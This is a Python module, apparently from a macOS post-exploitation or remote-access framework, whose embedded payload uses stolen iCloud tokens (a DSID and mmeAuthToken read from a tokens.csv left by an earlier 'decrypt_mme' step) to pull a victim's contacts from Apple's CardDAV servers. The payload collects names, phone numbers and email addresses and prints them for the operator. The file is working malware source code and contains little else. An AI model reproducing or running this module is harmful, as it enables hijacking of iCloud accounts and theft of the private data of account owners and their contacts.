class Module:
    def __init__(self):
        self.info = {
            "Author": ["Marten4n6"],
            "Description": "Retrieves iCloud contacts.",
            "References": [
                "https://github.com/manwhoami/iCloudContacts"
            ],
            "Task": False
        }
        self.code = None

    def setup(self, module_view, output_view, successful):
        successful.put(True)

    def run(self):
        return """\
        import plistlib
        import csv
        from xml.etree import ElementTree


        def get_card_links(dsid, mme_token):
            url = "https://p04-contacts.icloud.com/%s/carddavhome/card" % dsid
            headers = {
                "Depth": "1",
                "Authorization": "X-MobileMe-AuthToken %s" % base64.b64encode("%s:%s" % (dsid, mme_token)),
                "Content-Type": "text/xml",
            }
            data = \"\"\"<?xml version="1.0" encoding="UTF-8"?>
            <A:propfind xmlns:A="DAV:">
                <A:prop>
                <A:getetag/>
                </A:prop>
            </A:propfind>
            \"\"\"

            request = urllib2.Request(url, data, headers)
            request.get_method = lambda: "PROPFIND"  # Important!
            response = urllib2.urlopen(request)

            zebra = ElementTree.fromstring(response.read())

            return_data = \"\"\"<?xml version="1.0" encoding="UTF-8"?>
            <F:addressbook-multiget xmlns:F="urn:ietf:params:xml:ns:carddav">
            <A:prop xmlns:A="DAV:">
                <A:getetag/>
                <F:address-data/>
            </A:prop>\\n\"\"\"

            for response in zebra:
                for link in response:
                    href = response.find("{DAV:}href").text  # Get each link in the tree
                return_data += "<A:href xmlns:A=\\"DAV:\\">%s</A:href>\\n" % href

            return "%s</F:addressbook-multiget>" % str(return_data)


        def get_card_data(dsid, mme_token):
            url = "https://p04-contacts.icloud.com/%s/carddavhome/card" % dsid
            headers = {
                "Content-Type": "text/xml",
                "Authorization": "X-MobileMe-AuthToken %s" % base64.b64encode("%s:%s" % (dsid, mme_token))
            }
            data = get_card_links(dsid, mme_token)

            request = urllib2.Request(url, data, headers)
            request.get_method = lambda: "REPORT"  # Important!
            response = urllib2.urlopen(request)

            zebra = ElementTree.fromstring(response.read())
            cards = []

            for response in zebra:
                phone_numbers, email = [], []
                contact_name = ""

                v_card = response.find("{DAV:}propstat").find("{DAV:}prop").find(
                    "{urn:ietf:params:xml:ns:carddav}address-data"
                ).text

                if v_card:
                    for line in v_card.splitlines():
                        if line.startswith("FN:"):
                            contact_name = line[3:]
                        if line.startswith("TEL;"):
                            number = line.split("type")[-1].split(":")[-1].replace(
                                     "(", "").replace(")", "").replace(" ", "").replace("-", "").encode("ascii", "ignore")

                            phone_numbers.append(number)
                        if line.startswith("EMAIL;") or line.startswith("item1.EMAIL;"):
                            email.append(line.split(":")[-1])
                    cards.append(([contact_name], phone_numbers, email))
            return sorted(cards)

        
        tokens_file = PROGRAM_DIRECTORY + "/tokens.csv"
        dsid = None
        mme_token = None
        
        if os.path.exists(tokens_file):
            # Get the DSID and mmeAuthToken.
            with open(tokens_file, "rb") as csv_file:
                reader = csv.reader(csv_file, delimiter=',', quotechar='"')
                
                for row in reader:                        
                    if row[0].startswith("DSID"):
                        dsid = row[1]
                    elif row[0].startswith("mmeAuthToken"):
                        mme_token = row[1]
        if not dsid or not mme_token:
            print MESSAGE_ATTENTION + "Failed to find tokens, please run decrypt_mme first."
        else:        
            try:
                print MESSAGE_INFO + "iCloud contacts: "
                    
                for vcard in get_card_data(dsid, mme_token):
                    print vcard[0][0] + ":",

                    for numbers in vcard[1]:
                        print "[%s]" % numbers,
                    for emails in vcard[2]:
                        print "[%s]" % emails,
                    print "\\n",
            except urllib2.HTTPError as ex:
                print MESSAGE_ATTENTION + "Unexpected error: " + str(ex)
        """
